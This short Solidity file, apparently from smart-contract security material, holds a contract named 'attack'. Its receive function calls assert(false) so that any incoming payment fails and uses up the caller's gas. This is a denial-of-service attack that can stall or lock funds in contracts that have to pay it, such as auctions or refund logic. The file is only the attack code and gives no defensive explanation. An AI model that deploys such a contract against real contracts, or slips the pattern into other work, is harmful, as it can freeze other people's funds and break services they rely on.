pragma solidity ^0.6.0;
contract attack
{
    receive() external payable{
        assert(false);            // Consumes all the gas from the caller function
    }
}
